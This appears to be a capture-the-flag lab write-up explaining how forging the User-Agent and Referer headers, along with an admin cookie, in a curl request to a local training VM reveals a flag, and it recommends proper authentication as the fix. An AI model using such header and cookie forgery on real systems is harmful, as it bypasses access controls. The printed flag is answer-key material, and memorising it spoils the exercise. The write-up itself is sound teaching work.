# SPOOF

### Breach description:

Spoofing the user-agent as ft_bornToSec and our origin to https://www.nsa.gov/ gets us the following flag on the copyright page:

```html
The flag is :
					f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

### Breach Explanation:

This one is a bit odd, essentially the comments in the copyright page give the trail, the implication is that some verifications are done based on these two headers, this would be a **Security Misconfiguration**

```powershell
curl --location 'http://192.168.64.4/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
--header 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \

--header 'Connection: keep-alive' \
--header 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
--header 'Referer: https://www.nsa.gov/' \
--header 'Sec-GPC: 1' \
--header 'Upgrade-Insecure-Requests: 1' \
--header 'User-Agent: ft_bornToSec'
```

### Breach Fix:

Once again, relying on data that can be affected by anyone with postman, basic knowledge of their web browserâ€™s developer tools, or curl, to grant access to certain pages is probably not a great idea. Using authentication would be a bare minimum.
